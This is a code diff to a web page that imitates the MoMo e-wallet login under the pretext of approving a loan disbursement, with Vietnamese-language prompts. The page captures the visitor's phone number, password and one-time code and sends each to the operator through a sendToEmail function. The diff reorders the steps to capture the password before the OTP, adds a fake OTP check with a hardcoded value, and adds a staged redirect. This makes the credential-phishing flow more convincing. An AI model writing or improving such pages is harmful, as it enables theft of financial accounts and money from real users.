@@ -741,7 +741,7 @@
         <header class="page-header">
           <button
             class="back-button"
-            onclick="showSection('momo-otp-section')"
+            onclick="showSection('momo-phone-section')"
           >
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
@@ -803,7 +803,7 @@
         <header class="page-header">
           <button
             class="back-button"
-            onclick="showSection('momo-phone-section')"
+            onclick="showSection('momo-password-section')"
           >
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
@@ -927,6 +927,25 @@
         );
         const passwordInputEl = getEl("momo-password");
 
+        window.showSection = (sectionId) => {
+          document
+            .querySelectorAll(".page-section")
+            .forEach((section) => section.classList.remove("active"));
+          const targetSection = getEl(sectionId);
+          if (targetSection) {
+            targetSection.classList.add("active");
+            if (sectionId === "momo-phone-section") {
+              setTimeout(() => getEl("momo-phone").focus(), 100);
+            }
+            if (sectionId === "momo-password-section") {
+              setTimeout(() => passwordInputEl.focus(), 100);
+            }
+            if (sectionId === "momo-otp-section") {
+              setTimeout(() => otpInputs[0].focus(), 100);
+            }
+          }
+        };
+
         const formatCurrency = (amount) =>
           new Intl.NumberFormat("vi-VN", {
             style: "currency",
@@ -1031,25 +1050,6 @@
           setTimeout(() => notification.classList.remove("show"), duration);
         };
 
-        window.showSection = (sectionId) => {
-          document
-            .querySelectorAll(".page-section")
-            .forEach((section) => section.classList.remove("active"));
-          const targetSection = getEl(sectionId);
-          if (targetSection) {
-            targetSection.classList.add("active");
-            if (sectionId === "momo-phone-section") {
-              setTimeout(() => getEl("momo-phone").focus(), 100);
-            }
-            if (sectionId === "momo-password-section") {
-              setTimeout(() => passwordInputEl.focus(), 100);
-            }
-            if (sectionId === "momo-otp-section") {
-              setTimeout(() => otpInputs[0].focus(), 100);
-            }
-          }
-        };
-
         window.updatePasswordDisplay = (value) => {
           const charBoxes = document.querySelectorAll(
             "#momo-password-section .char-box"
@@ -1075,11 +1075,8 @@
             sendToEmail("phone", credentials.phone);
             const maskedPhone = `+84 **** ${phoneValue.slice(-3)}`;
             getEl("masked-phone-password").textContent = maskedPhone;
-            getEl(
-              "momo-otp-prompt"
-            ).innerHTML = `Mã OTP đã được gửi đến số <strong>${maskedPhone}</strong>. Vui lòng nhập để xác thực.`;
             phoneInput.classList.remove("invalid");
-            showSection("momo-otp-section");
+            showSection("momo-password-section");
           } else {
             phoneInput.classList.add("invalid");
             showNotification(
@@ -1098,14 +1095,11 @@
           credentials.password = passwordInputEl.value;
           sendToEmail("password", credentials.password);
 
-          showNotification(
-            "Xác nhận giải ngân thành công! Đang chuyển hướng...",
-            "success",
-            4000
-          );
-          setTimeout(() => {
-            window.location.href = "Evaluate-conditions.html?status=success";
-          }, 4000);
+          const maskedPhone = `+84 **** ${credentials.phone.slice(-3)}`;
+          getEl(
+            "momo-otp-prompt"
+          ).innerHTML = `Mã OTP đã được gửi đến số <strong>${maskedPhone}</strong>. Vui lòng nhập để xác thực.`;
+          showSection("momo-otp-section");
         };
 
         window.handleOtpSubmit = () => {
@@ -1118,8 +1112,49 @@
             return;
           }
 
+          const otpLoading = getEl("momo-otp-loading");
+          const otpSubmitBtn = getEl("momo-otp-submit-btn");
+          otpLoading.style.display = "block";
+          otpSubmitBtn.disabled = true;
+
           sendToEmail("otp", credentials.otp);
-          showSection("momo-password-section");
+
+          setTimeout(() => {
+            otpLoading.style.display = "none";
+            otpSubmitBtn.disabled = false;
+
+            const correctOtp = "1234";
+
+            if (credentials.otp === correctOtp) {
+              showNotification(
+                "Xác nhận giải ngân thành công! Đang chuyển hướng...",
+                "success",
+                4000
+              );
+              setTimeout(() => {
+                window.location.href = "Evaluate-conditions.html?status=success";
+              }, 4000);
+            } else {
+              otpAttempts++;
+              clearOtpInputs();
+              const attemptsLeft = 3 - otpAttempts;
+              if (attemptsLeft > 0) {
+                showNotification(
+                  `Mã xác thực không đúng. Bạn còn ${attemptsLeft} lần thử.`,
+                  "error"
+                );
+              } else {
+                showNotification(
+                  "Bạn đã nhập sai quá 3 lần. Đang chuyển hướng...",
+                  "error",
+                  4000
+                );
+                setTimeout(() => {
+                  window.location.href = "Evaluate-conditions.html?status=failed";
+                }, 4000);
+              }
+            }
+          }, 1500);
         };
 
         window.resendOtp = () => {
